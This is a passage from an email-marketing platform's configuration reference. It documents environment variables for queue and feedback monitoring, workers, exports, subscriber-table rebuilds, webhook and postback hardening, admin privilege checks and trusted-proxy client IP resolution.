    EG_QUEUE_FEEDBACK_MIN_DELIVERED_RATIO=0.10          # Alert when delivered events in the window are zero or below this share (0..1) of sends
    EG_QUEUE_FEEDBACK_BOUNCE_SILENCE_HOURS=6            # Alert when no bounce has arrived for this many hours while sends in that period reach the floor
    EG_QUEUE_MONITOR_WEBHOOK_URL=                       # Webhook for monitor alerts; empty = log only (alerts are ALWAYS logged)
    EG_QUEUE_MONITOR_WEBHOOK_HMAC_SECRET=               # HMAC-SHA256 secret for the X-Octeth-Signature header on monitor webhooks
    EG_QUEUE_MONITOR_NOTIFICATION_COOLDOWN_MINUTES=30   # Per-alert-type cooldown (minutes) between webhook notifications
    ```

    The Email Gateway Queue Monitor watches `oempro_eg_queue` for three independent conditions: a **failure-rate spike** (failed deliveries exceeding both the rate threshold *and* the absolute floor within the window), a **stalled Pending backlog** (overdue Pending rows piling up because workers are down or behind), and **MTA feedback silence** (gateway sends continue but the delivered, bounce and complaint events your MTA reports back stop arriving). All conditions are always written to the log. A webhook is sent only when a URL is configured and the per-type cooldown has elapsed. Failure-spike and stall alerts include a per-domain and per-user breakdown of the worst offenders.

    **MTA feedback silence.** Delivered, bounce and complaint events only reach Octeth when the whole path works: the PowerMTA accounting post (or fluentd), the `process_pmta_log_file` API command, the `emailgateway_events` worker and ClickHouse, or the bounce webhook for bounces. A break anywhere on that path looks the same from the outside: gateway sends keep completing and no feedback comes back, which blinds suppression, bounce and complaint counters and reputation reports. The check measures what actually arrives:

    - When gateway sends in `EG_QUEUE_FEEDBACK_WINDOW_MINUTES` reach `EG_QUEUE_FEEDBACK_MIN_SENDS`, it alerts if delivered events in the same window are zero (reason `no_delivered_events`) or below `EG_QUEUE_FEEDBACK_MIN_DELIVERED_RATIO` of the sends (reason `delivered_ratio_low`).
    - When gateway sends in the last `EG_QUEUE_FEEDBACK_BOUNCE_SILENCE_HOURS` reach the floor, it alerts if no bounce arrived in that period, from either ClickHouse or the bounce webhook (reason `bounce_silence`).
    - If the ClickHouse query fails, it alerts with reason `eg_events_query_failed`, because an unreachable event store is itself a dark pipeline.
    - Complaint age is reported in the alert, but complaints alone never trigger one.

    The check arms itself only once feedback has been seen: the delivered checks after the first delivered event, the bounce check after the first bounce (in ClickHouse or on the bounce webhook). An install whose MTA never reports back stays quiet. Once armed, it stays armed even after ClickHouse retention (31 days) has removed the old events. The alert webhook has `event_type` `eg_queue.feedback_silence`, a `reasons` list, the send and event counts, the newest event time and age per type, and a list of places to check. It has its own cooldown, separate from the other two alerts.

    The same freshness is shown on **Admin Area > Bounce Processing** and published on `/metrics` as `octeth_eg_feedback_last_event_age_seconds{event}`.

19. **Campaign Export**
    ```bash
    CAMPAIGN_EXPORT_MAX_ROWS=10000   # Hard cap on rows written per campaigns.export job (protects against runaway memory/time on very large accounts)
    ```

20. **Segment Subscriber Counts**

    Controls the asynchronous recompute of segment subscriber counts. `Segments.Get` never recomputes inline; stale or never-computed segments are enqueued and recomputed by the `cli/segment_counter.php` worker.
    ```bash
    SEGMENT_COUNT_STALENESS_SECONDS=600     # Age (seconds) after which a persisted segment count is considered stale and queued for recompute (default 10 min)
    SEGMENT_COUNTER_WORKER_BATCH_SIZE=100   # Max segments drained from the recount pending-set per worker run
    SEGMENT_COUNTER_WORKER_TIMEOUT=120      # Inner HTTP timeout (seconds) for the background recompute call (CLI worker only)
    SEGMENT_COUNTER_WORKER_CONCURRENCY=4    # Parallel segment_counter.php workers per cron tick (via cli/segment_counter_parallel.sh). SPOP atomicity prevents double-processing; only shared cost is concurrent MySQL COUNT(*) load. 1 = single worker, clamped to 16
    ```

    The `*/2 * * * *` cron entry runs `cli/segment_counter_parallel.sh`, which launches `SEGMENT_COUNTER_WORKER_CONCURRENCY` copies of the one-shot `cli/segment_counter.php` worker in parallel and uses an `flock` so overlapping ticks never stack beyond that count. The workers self-balance across the shared Redis pending-set.

21. **Journey Decision Node**
    ```bash
    JOURNEY_DECISION_QUERY_TIMEOUT=5   # Total timeout (seconds) for a journey Decision node's segment-query evaluation. On timeout/error the subscriber takes the No branch and an ERROR is logged
    ```

22. **Subscriber Activity Tab**
    ```bash
    SUBSCRIBER_ACTIVITY_HUMAN_OPEN_KEEP=5   # Newest human email-opens kept individually per campaign before the rest collapse into a "+X more" summary. Automated (bot/proxy/prefetch) opens always collapse into one flagged item
    ```

23. **Scheduled Sender-Domain Re-Verification**

    A traffic-independent hourly cron (`cli/sender_domain_reverify_cron.php`) that sweeps already-approved (`Status='Enabled'`) sender domains and enqueues stale ones onto the existing `sender_domain_verification` queue, so DNS drift (SPF/DKIM/DMARC/tracking) is detected even on idle or campaign-only domains. The existing worker performs the actual DNS check; this cron never auto-disables a domain.
    ```bash
    SENDER_DOMAIN_REVERIFY_STALENESS_HOURS=24   # A domain is re-verified when its LastVerifiedAt is older than this many hours (or never set). Default 24
    SENDER_DOMAIN_REVERIFY_BATCH_SIZE=100       # Hard cap on stale domains enqueued per hourly cron tick (bounds DNS-resolver load)
    ```

24. **Email Preview / Test-Send Rate Limit**

    The `email.emailpreview` endpoint accepts an arbitrary recipient by design (users preview to colleagues and seed inboxes), so it cannot restrict *who* receives a preview. To bound abuse of the platform's sending reputation (mass phishing via a valid or stolen API key), it caps preview/test sends per account per rolling window and refuses to deliver to a globally-suppressed recipient. The rate limit is Redis-backed and **fails open** (previews are allowed, with a WARNING logged) if Redis is unavailable.
    ```bash
    EMAIL_PREVIEW_RATE_LIMIT=30              # Max preview/test sends per account within the window; 0 disables the limit
    EMAIL_PREVIEW_RATE_WINDOW_SECONDS=3600   # Rolling window (seconds) for the preview rate limit. Default 3600 (1 hour)
    ```

25. **Outbound HTTP User-Agent**

    The `User-Agent` sent on outbound HTTP requests made through `Core::DataPostToRemoteURL()` — RSS feed fetches, journey/webhook posts, remote data posts, and ~36 other call sites. The previous hardcoded 2008 `Firefox/3.0.3` string is now rejected with HTTP 403 by many WordPress sites, WAFs and CDNs, which silently broke RSS embedding in recurring campaigns. Leave the modern default unless you have a specific reason to change it.
    ```bash
    OUTBOUND_HTTP_USER_AGENT="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36"
    ```

26. **MySQL Stuck / Long-Running Query Monitor**

    ```bash
    MYSQL_QUERY_MONITOR_ENABLED=true                        # Enable the stuck-query monitor cron (runs every 5 minutes)
    MYSQL_QUERY_MONITOR_THRESHOLD_SECONDS=30                # Flag any query whose running time (seconds) is at or above this
    MYSQL_QUERY_MONITOR_EXCEPTION_PATTERNS=                 # |||-separated regexes for known long runners to suppress (see below)
    MYSQL_QUERY_MONITOR_MAX_QUERY_LENGTH=500               # Truncate query text to this many chars in the log and webhook payload
    MYSQL_QUERY_MONITOR_WEBHOOK_URL=                        # Webhook URL for alerts; empty = log only
    MYSQL_QUERY_MONITOR_WEBHOOK_HMAC_SECRET=               # HMAC-SHA256 secret for the X-Octeth-Signature header
    MYSQL_QUERY_MONITOR_NOTIFICATION_COOLDOWN_MINUTES=30    # Cooldown between webhook notifications (condition still logged each tick)
    ```

    The MySQL Query Monitor (`cli/mysql_query_monitor.php`) inspects `information_schema.processlist` every 5 minutes and flags any query running at or beyond `MYSQL_QUERY_MONITOR_THRESHOLD_SECONDS`. Idle/system threads (`Sleep`, `Daemon`, `Binlog Dump`) and the monitor's own connection are always excluded. Breaches are **always** written to the log; a webhook (with optional HMAC signature) is POSTed only when `MYSQL_QUERY_MONITOR_WEBHOOK_URL` is set and the cooldown has elapsed. Query text is truncated to `MYSQL_QUERY_MONITOR_MAX_QUERY_LENGTH` characters to bound leakage of sensitive literals.

    **Exception list:** `MYSQL_QUERY_MONITOR_EXCEPTION_PATTERNS` is a list of case-insensitive regular expressions matched against the query text, separated by `|||` (a triple pipe — a single `|` is a valid regex alternation operator and is *not* treated as a separator). Matching queries (backups, migrations, aggregators) are suppressed. Quote the whole value when any pattern contains a space:
    ```bash
    MYSQL_QUERY_MONITOR_EXCEPTION_PATTERNS="mysqldump|||OPTIMIZE TABLE|||ALTER TABLE"
    ```

    **Visibility note:** Octeth's application MySQL user does not hold the global `PROCESS` privilege, so `information_schema.processlist` only exposes threads authenticated as that user — i.e. Octeth's own queries, which is exactly the runaway-query target. Queries owned by other accounts (e.g. `root`, replication) are not visible unless you grant `PROCESS` to the application user.

27b. **Xdebug (development only)**

    ```bash
    OEMPRO_XDEBUG_ENABLED=false                             # Load the Xdebug extension in the containers (default: false)
    ```

    The shipped Docker images install the Xdebug extension for both PHP 5.6 and PHP 8.1, but it is **disabled by default**. Merely *loading* Xdebug installs per-call stack-trace hooks (the "Xdebug tax") that slow every PHP process — most noticeably the long-lived PHP 5.6 supervisor workers and the send engine — even with remote debugging turned off. Set `OEMPRO_XDEBUG_ENABLED=true` **only in local development** to enable step debugging / profiling; leave it `false` (or unset) in production. The flag is applied at container start by `_dockerfiles/xdebug-toggle.sh`, which enables/disables the extension for every PHP version and SAPI via `phpenmod`/`phpdismod`. Restart the containers after changing it.

27. **Export File Retention and Stale-Job Recovery**

    ```bash
    EXPORT_FILE_RETENTION_DAYS=30                           # Days to keep completed/failed export files before cleanup
    EXPORT_STALE_PROCESSING_TIMEOUT_MINUTES=360             # Minutes an export may stall in "Processing" before it is marked Failed (default: 360)
    ```

    Completed export result files are written to `data/exports/{ExportID}.export` and were previously never cleaned up, so export storage grew without bound on active accounts. The `cli/export_files_cleanup.php` cron (daily at 04:45 UTC) deletes the result files of **terminal** export jobs (`Completed` or `Failed`) whose completion time is older than `EXPORT_FILE_RETENTION_DAYS`. In-flight jobs (`Pending` / `Processing`) are **never** touched. Only the on-disk file is removed — the export row is preserved for history, so downloading an expired export returns a clear "expired" error (HTTP 410) instead of a broken or empty download. Raise this value to keep exports downloadable for longer.

    **`EXPORT_STALE_PROCESSING_TIMEOUT_MINUTES`** — the number of minutes an export job may sit in the `Processing` state without making progress before the export worker marks it `Failed`. Accepted range `15`–`10080` (15 minutes to 7 days); values outside it are ignored and the 360-minute default is used.

    The export worker claims a queued job, flips it to `Processing`, and then runs the export outside of a database transaction. If the worker process dies after the claim — a PHP fatal error, an out-of-memory kill, or a `SIGKILL` during a deployment — the job is left stranded in `Processing`. Workers only ever pick up jobs in the `Pending` state, so before this setting existed a stranded job was never retried and never failed: the user's export stayed on "Working" forever and no file was ever produced. The worker now sweeps for stranded jobs and marks them `Failed`, so the user gets a clear outcome and can simply request the export again.

    **Choosing a value.** Progress is measured from the most recent of the job's start, last-update and submit timestamps. Campaign and multi-list exports refresh their last-update timestamp as they run, so for those this is a *no-progress* budget rather than a total-runtime budget; subscriber exports do not report progress, so their whole runtime counts against it. Keep the value comfortably above your longest healthy export. Octeth runs **two** export workers, so a value that is too low can mark a job as failed while another worker is still legitimately working on it — no data is corrupted if that happens (the running worker detects the `Failed` verdict and does not overwrite it), but the user loses an export that would otherwise have completed. Lower it only if your exports are known to be small and you want stranded jobs surfaced faster. A reaped job has its finish time recorded, so its partial result file is reclaimed by the normal `EXPORT_FILE_RETENTION_DAYS` cleanup once the retention window elapses.

28. **Long-Running Worker Memory Hygiene**

    ```bash
    WORKER_MEMORY_RECYCLE_ENABLED=true                      # Master switch for the graceful worker recycle valve (default: true)
    WORKER_MEMORY_RECYCLE_THRESHOLD=0.85                    # Fraction (0..1) of the PHP memory_limit that triggers a recycle (default: 0.85)
    WORKER_MEMORY_LOG_ENABLED=false                         # Enable per-iteration memory logging in loop workers (default: false)
    ```

    The long-running `while(true)` daemon workers — campaign delivery/picker, email gateway delivery, import (both), export, journeys, webhooks, and transactional delivery — share a common memory-hygiene routine (`includes/classes/workermemory.inc.php`). Every loop iteration each worker flushes the DB layer's in-memory query history (`MySqlDatabaseInterface::ClearSQLHistory()`) so it can never grow unbounded, and checks a shared graceful **recycle** valve.

    - **`WORKER_MEMORY_RECYCLE_ENABLED`** — when `true`, a worker whose `memory_get_usage(true)` reaches `WORKER_MEMORY_RECYCLE_THRESHOLD` of the PHP `memory_limit` exits cleanly with status `0` **between units of work** (never mid-batch/transaction). Because every worker runs under supervisord with `autorestart=true`, this is treated as a normal restart — not a counted failure — and the process starts fresh with a clean heap instead of drifting into a fatal out-of-memory error. Set to `false` to disable self-recycling (workers still flush SQL history each iteration).
    - **`WORKER_MEMORY_RECYCLE_THRESHOLD`** — the trigger fraction. The accepted band is `0.5` to `1.0`; a value outside it falls back to `0.85`. The `0.5` floor is deliberate: the recycle check runs at the top of each worker loop, so a threshold low enough that a worker is already over it at startup would make it exit within ~1s of every start, which supervisord (default `startsecs` 1s, `startretries=10`) escalates to a permanent **FATAL** stop. Keep it conservative (well below `1.0`). When the PHP `memory_limit` is unlimited (`-1`), recycling is disabled regardless of this value.
    - **`WORKER_MEMORY_LOG_ENABLED`** — when `true`, each worker emits a per-iteration `DEBUG` memory-status line (current/peak/limit MB and usage percent). Off by default to limit log volume; turn it on temporarily when investigating a suspected leak.

29. **Subscriber Browse Query Timeout**

    ```bash
    SUBSCRIBER_BROWSE_QUERY_TIMEOUT=30   # Total timeout (seconds) for the subscriber browse page's count + listing query calls (default: 30)
    ```

    The subscriber browse page builds its result with two internal HTTP calls to the query builder: one for the total **count** (`COUNT(*)`, no `LIMIT`) and one for the **listing** (bounded by the page size). Both are bounded by this single timeout (applied to both the connection and total execution time).

    The value was previously hard-coded at `5` seconds, which was too tight for large lists and segments: the unbounded count query — which runs correlated `NOT EXISTS` / `EXISTS` subqueries against the open/journey tables — could exceed it and **time out to a silent `0`**, while the `LIMIT`-bounded listing returned within budget. The result was a page whose badge read "0 / No subscribers found" while a full page of subscriber rows rendered below it. Raising the timeout lets the count complete. If a genuinely huge segment still exceeds it, the count is now reported as *temporarily unavailable* (never a misleading `0`) and the failure is logged, so the badge and the listing can no longer contradict each other.

30. **Proactive Subscriber-Table Rebuild**

    ```bash
    SUBSCRIBER_TABLE_REBUILD_ENABLED=true                 # Master switch for the nightly rebuild command (default: true)
    SUBSCRIBER_TABLE_REBUILD_ROW_VERSION_THRESHOLD=48     # Per-list instant-DDL counter at/above which a table is rebuilt (default: 48; clamped to 1..63)
    SUBSCRIBER_TABLE_REBUILD_BATCH_SIZE=20               # Max tables rebuilt per nightly run (default: 20)
    SUBSCRIBER_TABLE_REBUILD_TIME_BUDGET_SECONDS=1800   # Wall-clock budget per run in seconds (default: 1800)
    ```

    Custom fields are stored as real columns on the per-list `oempro_subscribers_<ListID>` tables, added and dropped with *instant* (metadata-only) `ALTER TABLE` statements. InnoDB allows only about **64** accumulated instant-DDL "row versions" per table; once a busy, long-lived list crosses that limit, the **next** custom-field add silently turns into a **full table rebuild** — and because that happens inside the interactive request, on a million-row list it blocks the request and locks the table for tens of seconds.

    The direct signal for this (`information_schema.INNODB_TABLES.TOTAL_ROW_VERSIONS`) requires the MySQL `PROCESS` privilege, which the application's database user does not have. So Octeth tracks the accumulation itself: every instant add/drop/change of a custom-field column increments a per-list counter (`InstantDDLRowVersions` on `oempro_subscriber_lists`), and the scheduled `oempro:rebuild-subscriber-tables` command (nightly, `03:00`) rebuilds any table whose counter has reached `SUBSCRIBER_TABLE_REBUILD_ROW_VERSION_THRESHOLD`, resetting both the counter and InnoDB's real row-version count. Because this runs in the background, the blocking rebuild never lands in a user request.

    - **`SUBSCRIBER_TABLE_REBUILD_ENABLED`** — set to `false` to disable the nightly command entirely (it becomes a no-op).
    - **`SUBSCRIBER_TABLE_REBUILD_ROW_VERSION_THRESHOLD`** — kept comfortably below the ~64 hard limit so there is headroom for adds between nightly runs. Values outside `1..63` are clamped.
    - **`SUBSCRIBER_TABLE_REBUILD_BATCH_SIZE`** / **`SUBSCRIBER_TABLE_REBUILD_TIME_BUDGET_SECONDS`** — bound the work per run on large installs; tables not reached this run are picked up the next night.

    The rebuild runs `ALTER TABLE … ENGINE=InnoDB` fully online (`ALGORITHM=INPLACE, LOCK=NONE`) when possible; a table carrying a `FULLTEXT` index (the `ft_email` search index) cannot rebuild in place, so it falls back to `ALGORITHM=COPY, LOCK=SHARED` (reads continue, writes are briefly blocked) — still off the request path. Notes: existing tables start with a counter of `0` (their historical accumulation is unknown without `PROCESS`), so the mechanism protects against **future** accumulation; run `php system/artisan oempro:rebuild-subscriber-tables --dry-run` to preview which tables would be rebuilt.

31. **S2S Conversion Postback Guard Rails**

    ```bash
    S2S_POSTBACK_MAX_VALUE=1000000        # largest conversion amount accepted; out of range is refused, not clamped
    S2S_POSTBACK_RATE_LIMIT=60            # postbacks per identifier and per source address within the window
    S2S_POSTBACK_RATE_WINDOW_SECONDS=3600 # rolling window for the rate limit
    ```

    `https://{host}/system/s2s-postback` is a **public, unauthenticated** route by design: an advertiser's server posts to it when a click you sent turns into a sale. The only thing identifying the conversion is the `ocrid` parameter, and until v6.0.0 that carried no key at all, so the account, campaign, subscriber and list it named could be **constructed from nothing**. Anyone who found the endpoint could record conversions, with an amount of their choosing, against any account on the installation.

    Identifiers are now signed with a keyed MAC, and a signed identifier that has been altered is refused with **HTTP 403**. Identifiers are generated at **click time** by the tracking redirect rather than embedded in sent email, so the signature covers every click from the moment you upgrade, including clicks on campaigns sent long before it. Nothing needs to change at your end and no conversion tracking breaks.

    Identifiers **without** a signature are still accepted, with no cut-off date, because an advertiser may still be holding one captured from a click made before the upgrade. The settings above are what bound that remaining exposure:

    - **`S2S_POSTBACK_MAX_VALUE`** is the largest amount accepted. The amount arrives straight off a public request and the column that stores it is a `varchar`, so before this release the figure written into revenue reporting was whatever the caller said, including a non-numeric string. A value that is not a number, is negative, or is above this bound is **refused with HTTP 422** rather than clamped, so your reports never contain a figure nobody actually sent. Clamped to `[0.01, 1000000000]`.
    - **`S2S_POSTBACK_RATE_LIMIT`** / **`S2S_POSTBACK_RATE_WINDOW_SECONDS`** cap postbacks per identifier and per source address. An identical postback is already dropped as a duplicate, but varying the reported amount by a cent would sidestep that, so the rate limit is what actually bounds a replay campaign. Raise it if you have a high-volume advertiser integration and see legitimate postbacks refused with **HTTP 429**. Clamped to `[1, 100000]` and `[1, 86400]`.

    Two further behaviours have no setting. A postback identical to one already recorded is answered as success but records nothing and does not increment the campaign's conversion count, since a retry after a timed-out request is the ordinary reason the same postback arrives twice; a genuinely **different** amount still records, because a subscriber converting twice is a real thing. And every accepted conversion now stores the address that submitted it and whether its identifier was signed.

    **What cannot be repaired:** conversions recorded before this release carry no marker distinguishing a genuine one from a forged one, and none ever did. If revenue figures drive commission or billing for you, treat the historical numbers as unverified rather than assuming they can be cleaned.

32. **Bounce Webhook Authentication**

    ```bash
    BOUNCE_WEBHOOK_AUTH_ENABLED=true    # Require a signature header on /system/bounce_webhook (fresh installs enforce; upgrades keep their existing value)
    ```

    `https://{host}/system/bounce_webhook` is internet-exposed by design — PMTA/Logstash/fluentd senders POST bounce events to it from external mail servers — and was historically **unauthenticated**, so anyone on the internet could forge hard bounces for arbitrary recipient addresses and corrupt bounce reporting.

    When enabled, the endpoint requires a static HTTP header on every request:

    ```
    X-Octeth-Signature: <secret>
    ```

    where `<secret>` is derived deterministically as `sha256(OEMPRO_PASSWORD_SALT + ADMIN_API_KEY + OEMPRO_PASSWORD_SALT)` — the same derivation pattern as `CADDY_DOMAIN_VERIFY_CODE`, so no new secret is stored. The admin **Bounce Processing** page displays the current secret and a ready-to-copy sender configuration (Logstash `http` output) that already embeds the header. Both the `type=pmta` and `type=fluentd` processing paths are gated; a missing or invalid signature returns **HTTP 401** and nothing is processed (no bounce is registered, no stats row is written).

    - **Fresh installations enforce; no upgrade ever turns it on.** From v6.0.0 the shipped `_dockerfiles/examples/.oempro_env.example` is `true`, so a new installation is authenticated from day one, when no sender exists yet to break. The **code** default stays `false`, and an absent or empty value is treated as OFF. Three cases, and all three leave an upgrade working:

        - Your `.oempro_env` already has the key (every installation from v5.9.3 onward): the environment merge only appends keys that are **absent**, so your value is kept.
        - Your `.oempro_env` does not have the key (anything older than v5.9.3): the merge would normally append the example's `true`. An `@upgrade-value: false` annotation above the key in the example file makes it append `false` instead.
        - Fresh installation: the example file is copied wholesale, so you get `true`.

        The annotation is read by `merge_single_env()` in `cli/commands/upgrade.sh` and applies only on the upgrade path. It is used for this setting and not for the others that changed in this release, because enabling bounce authentication where a sender is already configured makes every bounce POST answer 401, and that failure appears only at the sender, so bounce processing would stop with Octeth reporting nothing.
    - **Enable it in this order:** first configure your sender to send the `X-Octeth-Signature` header (the admin **Bounce Processing** page shows the current secret and a ready-to-copy Logstash `http` output sample that already embeds it), *then* set this to `true` and restart. Reversing that order means every bounce POST is rejected with HTTP 401 in the interval — and because the failure happens at the sender, Octeth surfaces no error of its own. Bounce data drives suppression and deliverability, so the loss is quiet and compounding.
    - **Trade-off:** a static header is *not* a per-request HMAC. It does **not** stop replay of a captured valid POST, but — unlike a secret placed in the URL — it is **not written to access logs or referrers**, and it closes the unauthenticated-forgery vector entirely.
    - **Rotation:** because the secret derives from `OEMPRO_PASSWORD_SALT` and `ADMIN_API_KEY`, rotating either value changes the secret and requires updating every configured sender with the new header.

33. **Fluentd Bounce Webhook Batch Size**

    ```bash
    BOUNCE_WEBHOOK_FLUENTD_MAX_EVENTS=1000    # Maximum events accepted in one POST to /system/bounce_webhook?type=fluentd
    ```

    The fluentd bounce webhook (`https://{host}/system/bounce_webhook?type=fluentd`) accepts a JSON array of PowerMTA accounting records, as sent by Vector, Fluentd or Logstash `http` outputs. This setting is the largest number of array elements accepted in a single request.

    - **Above the limit** the webhook answers **HTTP 413** and queues nothing from that request. Configure your sender to split batches at or below this value.
    - **Recommended sender setting:** Vector `http` sink `batch.max_events = 1000` (Vector's default batch has no event limit and can carry several thousand records). For Fluentd use `chunk_limit_records 1000` in the buffer section, and for Logstash keep `pipeline.batch.size` at or below the limit. See [Bounce Processing](/v6.0.4/using-octeth/email-deliverability/bounce-processing#sending-batches-with-type-fluentd) for a Vector sample.
    - **Within the limit** the whole request is published to RabbitMQ over one connection with publisher confirms. The webhook answers **HTTP 200** (`StatusCode 250`) only when every eligible record is queued, and **HTTP 503** when RabbitMQ is unreachable or did not confirm the whole batch. Configure the sender to retry on 5xx.
    - **Retries are not deduplicated yet.** A batch that fails part way with 503 can have some records queued already, and the retry queues them again. This is rare (it needs RabbitMQ to fail mid-batch) and deduplication is a planned follow-up.
    - Integer from 1 to 100000. A missing, non-integer or out-of-range value falls back to **1000**. Only records whose return path (`orig`) starts with `eg-` and whose type is `r`, `d`, `b`, `rb` or `f` are queued, but every element counts toward the limit.

34. **Admin API Privilege Enforcement**

    ```bash
    ADMIN_API_ENFORCE_PRIVILEGES=true   # Check sub-admin privileges on admin API calls (on for fresh installs and upgrades; see below)
    ```

    Sub-admin accounts carry a privilege list (the same one that gates the admin screens). Historically the API never consulted it: any admin who could authenticate, with their own username and password, an `Admin.Login` session, or a per-sub-admin API key, could call every admin command. With this set to `true`, each admin command is checked against the privilege it declares and a call the sub-admin is not entitled to answers the standard `99999` (`Not enough privileges`) error. The master `ADMIN_API_KEY` resolves to the unrestricted master administrator and is never affected, so master-key integrations behave identically either way.

    The code default is `false`, but the shipped `.oempro_env.example` sets it to `true`, and an upgrade adds every setting your `.oempro_env` is missing with the example's value. So an install upgrading from a version older than v5.9.6 gets `true` too, exactly like a fresh install, and the upgrade names it in a warning block when it adds it. An install that already has the key keeps its value. To keep it off, add `ADMIN_API_ENFORCE_PRIVILEGES=false` to `.oempro_env` before upgrading, or set it to `false` afterwards and recreate the containers. Turn it on after confirming every integration that authenticates as a sub-admin holds the privileges it needs. Per-sub-admin API keys are issued on the sub-admin edit screen and are accepted on `AdminAPIKey` regardless of this setting.

35. **Admin Password Change Confirmation**

    ```bash
    ADMIN_UPDATE_REQUIRE_CURRENT_PASSWORD=true   # Require CurrentPassword on admin.update when Password is present (on for fresh installs and upgrades; see below)
    ```

    The admin Account screen has always demanded the current password before changing it, but that check lived only in the screen: the `admin.update` API command accepted a new password with no confirmation of the old one, so an API-driven admin UI could not carry the same guarantee. The command now takes an additive `CurrentPassword` parameter. A supplied value is always verified (`ErrorCode 10` when wrong); this setting decides whether omitting it alongside `Password` is refused (`ErrorCode 9`).

    The code default is `false`, but the shipped `.oempro_env.example` sets it to `true`, and an upgrade adds every setting your `.oempro_env` is missing with the example's value. So an install upgrading from a version older than v5.9.6 gets `true` too, exactly like a fresh install, and the upgrade names it in a warning block when it adds it. An install that already has the key keeps its value. To keep it off, add `ADMIN_UPDATE_REQUIRE_CURRENT_PASSWORD=false` to `.oempro_env` before upgrading, or set it to `false` afterwards and recreate the containers. An integration that changes the admin password without the new parameter then receives `ErrorCode 9`.

36. **User Password Change Confirmation**

    ```bash
    USER_UPDATE_REQUIRE_CURRENT_PASSWORD=true   # Require CurrentPassword on user.update when Password is present (on for fresh installs and upgrades; see below)
    ```

    The same confirmation, for the user side. `user.update` gained an additive `CurrentPassword` parameter. A supplied value is **always** verified and a wrong one answers `ErrorCode 10`, whatever this setting says; the setting only decides whether **omitting** it alongside `Password` is refused, with `ErrorCode 9`.

    It applies **only to a caller authenticated as the user**, that is a per-user API key or a `SessionID` from `user.login`. An admin-authenticated caller is never asked for it, because an administrator performing a reset cannot be expected to know the customer's password. The new user interface is unaffected: it verifies the current password itself and then writes through an admin-scoped call.

    ::: warning This key's example value changes behaviour on an upgrade
    The code default is `false`, so an install that already has this key keeps working. But an upgrade appends keys that are **absent** from your `.oempro_env` using the new version's example value, and the shipped example sets `true`. So an install upgrading from a version that predates this key starts enforcing it with no operator action, and an integration that changes a user's own password without sending `CurrentPassword` begins receiving `ErrorCode 9`. Either send the parameter or set the key to `false` explicitly.
    :::

37. **Trusted Proxies / Client IP Resolution**

    ```bash
    INTERNAL_PROXY_NETWORKS=192.168.99.0/24 # the bundled front end's own container network; change only if you changed the compose subnet
    TRUSTED_PROXIES=                       # extra trusted reverse proxies (IPv4 / CIDR, comma-separated); loopback is always trusted
    TRUST_CLOUDFLARE_CONNECTING_IP=false   # set true only when the app domain is served through Cloudflare (proxied DNS) and the origin is firewalled to Cloudflare's ranges
    ```

    Octeth always sits behind the internal HAProxy/Caddy reverse proxy (on loopback) and may additionally sit behind an external CDN/reverse proxy. The real client IP is resolved once, at startup, into `REMOTE_ADDR` — the value the admin **Authorized IP Addresses** allow-list, audit/login logs, rate limiting and tracking all consume.

    `X-Forwarded-For` is a comma-separated chain (`client, proxy1, proxy2`) and is **client-controllable**. Earlier versions copied the whole raw chain into `REMOTE_ADDR`, which broke the admin IP allow-list (an admin had to paste the entire chain verbatim, and enabling it turned `system.health.check` red with a 503) and let the header be spoofed.

    The resolver now honours forwarded headers **only when the request's immediate peer is a trusted proxy**:

    - **`INTERNAL_PROXY_NETWORKS`** (new in v6.0.0) is the bundled front end's own container network, and it is why a standard install now recovers the visitor's address with nothing to configure. Change it only if you changed the subnet in `docker-compose.yml`. Setting it empty leaves loopback as the only built-in trusted peer, which is the pre-v6.0.0 behaviour.

        Until v6.0.0 this documentation stated that a standard install recovered the client IP automatically. It did not. The bundled HAProxy reaches the application over the container network rather than over loopback, so its address was never trusted, the forwarded chain was discarded, and Octeth recorded the container's address as the visitor on every install. The default here is the fix, and because it lives in Octeth's code rather than in this file it applies to upgraded installs as well as new ones. See the [v6.0.0 upgrade notes](/changelog) for what changes as a result, including the fact that historical subscription, opt-in and unsubscription IP values hold a container address and cannot be recovered.

    - **`TRUSTED_PROXIES`** is for an **additional** proxy that *you* put in front of Octeth: your own load balancer, reverse proxy or CDN, as comma-separated IPv4 addresses and/or IPv4 CIDRs. It is not needed for the bundled front end, which `INTERNAL_PROXY_NETWORKS` covers. When the peer is trusted the chain is walked **right-to-left** and the first address that is **not** a trusted proxy is taken as the client IP. A browser is never a trusted peer, so a visitor cannot set their own address by sending the header.
    - **`TRUST_CLOUDFLARE_CONNECTING_IP`**: set `true` when the app domain is served through Cloudflare (proxied DNS). The client IP is then read from the `CF-Connecting-IP` header that Cloudflare writes, provided the request arrived through a trusted proxy and the value is a valid address that is neither loopback nor a trusted proxy. Leave it `false` on every install that is not behind Cloudflare.

        **Cloudflare installs that use a static certificate (`APP_DOMAIN_TLS_CERT`) need one of two setups.** From v6.0.1 HAProxy passes the real TCP peer through its TLS hop (issue #3103), so without one of them every visitor resolves to a Cloudflare edge address: in login and audit logs, in the admin **Authorized IP Addresses** check and in the subscription, opt-in and unsubscription IPs.

        1. Leave this key `false` and list Cloudflare's IPv4 ranges in `TRUSTED_PROXIES` (IPv4 CIDRs only, which covers an origin Cloudflare reaches over IPv4). The address is then taken from the `X-Forwarded-For` chain, where only a trusted hop can add an entry. This is the safer choice when the origin is not firewalled.
        2. Set this key `true` and firewall ports 80 and 443 to [Cloudflare's published IP ranges](https://www.cloudflare.com/ips/). Cloudflare only overwrites the header on traffic that passes through it, so without the firewall a client that connects to your server's IP directly can send its own `CF-Connecting-IP`.
    - **The new user interface** applies the same `INTERNAL_PROXY_NETWORKS` and `TRUSTED_PROXIES` trust set, plus loopback, and from v6.0.1 the same `TRUST_CLOUDFLARE_CONNECTING_IP` rule, to its own login activity, staff audit log and the unsubscription IP it sends to Octeth. Before v6.0.1 it trusted only the bundled HAProxy, so every one of those records held `127.0.0.1`, and rows written before the upgrade keep that value. The same list also decides whether the interface believes the forwarded HTTPS scheme, so if you changed the compose subnet, set `INTERNAL_PROXY_NETWORKS` to match or the interface can fall into a redirect loop. A changed value reaches the interface when the `oempro_ui` container restarts.

    A direct client (untrusted immediate peer) can never influence `REMOTE_ADDR`, so the admin IP allow-list can no longer be bypassed with a forged `X-Forwarded-For`. Loopback-originated requests (the internal health-check/cron probes) are exempt from the allow-list, so enabling it no longer breaks `system.health.check`. Note: audit/login rows written by an earlier version while behind a proxy may still contain a chain string in their IP column; the fix stops that going forward but does not rewrite historical rows.

